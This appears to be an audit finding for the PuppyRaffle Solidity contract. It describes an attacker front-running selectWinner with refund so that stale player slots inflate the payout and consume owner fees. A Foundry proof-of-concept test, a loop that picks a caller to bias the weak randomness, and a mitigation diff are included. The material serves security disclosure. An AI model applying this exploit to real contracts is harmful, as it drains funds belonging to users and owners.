Title: Front-running winner selection with `refund` lets attackers avoid losses and steal owner fees
Impact: High
Likelihood: Medium
Scope: `src/PuppyRaffle.sol`

# Root + Impact

## Description

A player who refunds should no longer be counted as a funded participant in the current raffle round. A player should also not be able to wait until winner selection is imminent, avoid their own raffle downside, and still distort the payout accounting.

An attacker can monitor the mempool for a `selectWinner` transaction. When the attacker sees winner selection about to execute, and the attacker is not the intended winner, they can front-run it with a higher gas fee and call `refund`. This returns the attacker's entrance fee before the raffle is drawn.

However, `selectWinner` still calculates the prize pool and protocol fee from `players.length * entranceFee`. The attacker's refunded slot remains in the array, so the attacker avoids their own loss while the raffle still accounts as if their entrance fee remained in the contract. When there are previously accrued owner fees or other ETH in the contract, the next winner can be paid with funds that should belong to the owner fees.

This is different from `H-03`. `H-03` is the general implementation bug where stale `address(0)` slots break normal raffle behavior. This finding is the attacker-timed version: the attacker specifically front-runs `selectWinner` with `refund` to avoid participation and manipulate the payout/fee accounting.

```solidity
function refund(uint256 playerIndex) public {
    ...
    // @> The player receives their entrance fee back.
    payable(msg.sender).sendValue(entranceFee);

    // @> The stale slot remains in the players array.
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}

function selectWinner() external {
    ...
    // @> Refunded entries are still counted as funded entries.
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    ...
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
}
```

## Risk

**Likelihood**:

* Players can refund any time before winner selection.

* `selectWinner` is a public transaction that can be observed in the mempool before execution.

* An attacker can submit a higher-gas `refund` transaction to execute before the pending `selectWinner`.

* `selectWinner` uses array length instead of actual active paid players or round-specific ETH collected.

**Impact**:

* A player can avoid participation loss by refunding immediately before winner selection while their stale slot still inflates the prize and fee calculations.

* Previously accrued owner fees can be used to pay the inflated prize pool.

* `totalFees` can become inconsistent with the contract balance, causing fee withdrawal to fail.

## Proof of Concept

The following test creates fees from the first raffle round, then simulates the attacker front-running winner selection with a refund in the second round. The second winner receives value funded by the first round's owner fees.

```solidity
function testRefundBeforeDrawCanConsumeOwnerFees() public {
    address[] memory firstRound = new address[](4);
    firstRound[0] = address(1);
    firstRound[1] = address(2);
    firstRound[2] = address(3);
    firstRound[3] = address(4);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(firstRound);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();

    uint256 firstRoundFees = (entranceFee * 4 * 20) / 100;
    assertEq(address(puppyRaffle).balance, firstRoundFees);

    address attacker = address(10);
    address winner = address(14);
    address[] memory secondRound = new address[](4);
    secondRound[0] = attacker;
    secondRound[1] = address(11);
    secondRound[2] = address(12);
    secondRound[3] = winner;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(secondRound);

    // The attacker observes a pending selectWinner transaction and front-runs it
    // with refund using a higher gas fee.
    vm.prank(attacker);
    puppyRaffle.refund(0);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    address biasedCaller;
    for (uint160 i = 100; i < 1000; i++) {
        address candidate = address(i);
        uint256 winnerIndex = uint256(
            keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))
        ) % secondRound.length;
        if (secondRound[winnerIndex] == winner) {
            biasedCaller = candidate;
            break;
        }
    }

    uint256 winnerBalanceBefore = winner.balance;
    vm.prank(biasedCaller);
    puppyRaffle.selectWinner();

    assertEq(winner.balance - winnerBalanceBefore, (entranceFee * 4 * 80) / 100);
    assertLt(address(puppyRaffle).balance, puppyRaffle.totalFees());
}
```

The attacker receives their refund, but their stale slot is still counted in the second round's payout calculation. The inflated payout consumes fees that were already owed to the owner.

## Recommended Mitigation

Track paid active entries per round and calculate prize/fee amounts from that active count or from round-specific accounting. Do not use raw `players.length` after refunds.

```diff
+ uint256 public activePlayerCount;

 function refund(uint256 playerIndex) public {
     ...
     players[playerIndex] = address(0);
+    activePlayerCount--;
 }

 function selectWinner() external {
     ...
-    uint256 totalAmountCollected = players.length * entranceFee;
+    uint256 totalAmountCollected = activePlayerCount * entranceFee;
     uint256 prizePool = (totalAmountCollected * 80) / 100;
     uint256 fee = (totalAmountCollected * 20) / 100;
     ...
 }
```
